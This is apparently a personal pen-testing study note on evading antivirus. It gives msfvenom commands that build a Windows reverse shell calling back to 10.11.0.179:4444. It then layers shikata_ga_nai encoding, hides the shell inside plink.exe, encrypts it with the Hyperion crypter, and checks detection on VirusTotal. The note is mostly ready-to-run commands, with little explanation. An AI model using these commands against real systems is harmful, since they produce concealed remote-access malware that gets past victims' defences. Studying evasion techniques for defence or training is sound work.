# Avoid Antivirus
the `msfpayload` and `msfencode` have beeb depricated in Metasploit in favour of `msfvenom` - however the results of the following experiment would stay the same.  

## msfvenom
- `msfvenom --list payloads`
- `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.179 LPORT=4444 -o shell_reverse.exe`  
- `msfvenom -p windows/shell_reverse_tcp -o reverse_shell_tcp.exe --platform windows --arch x86 LHOST=10.11.0.179 LPORT=4444`

> we'll submit our executable to `virustotal` [https://www.virustotal.com/gui/home
> we'll manipulate our reverse_shell executable further in order to try and avoid as many AV's as possible.

## encoders
```
msfvenom -l encoders
x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
```
> we'll now generate our reverse shell payload via `shikata_ga_nai` encoder, 9 times.
`msfvenom --payload windows/shell_reverse_tcp --out reverse_shell_tcp.exe --encoder x86/shikata_ga_nai --iterations 9 --platform windows --arch x86 LHOST=10.11.0.179 LPORT=4444`

## embeddint in executables
We'll Specify a custom executable file to use as a template  
```
msfvenom --payload windows/shell_reverse_tcp --encoder x86/shikata_ga_nai --iterations 9 --platform windows --arch x86 -x /usr/share/windows-binaries/plink.exe -f exe LHOST=10.11.0.179 LPORT=4444 > reverse_shell_tcp_embedded.exe
```
> results are not as good as we tought they'll be. but are improved.

## Packers and Crypters
> We'll use `Hyperion` (cross compiled on kali for windows os)
```
wget https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip
unzip Hyperion-1.2.zip
i686-w64-mingw32-c++ Hyperion-1.2/Src/Crypter/*.cpp -o hyperion.exe
# for older versions of Kali
i586-mingw32msvc-c++ Hyperion-1.0/Src/Crypter/*.cpp -o hyperion.exe
# or simply download it from https://github.com/Veil-Framework/Veil-Evasion/blob/master/tools/hyperion/hyperion.exe
```
```
i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe
wine hyperion.exe reverse_shell_tcp_embedded.exe reverse_shell_tcp_embedded_crypted.exe
```

## Veil Framework
> https://github.com/Veil-Framework/Veil
- Evasion => Generates Anti-Virus avoiding executables
- Ordnance => Generates shellcode for supported payloads

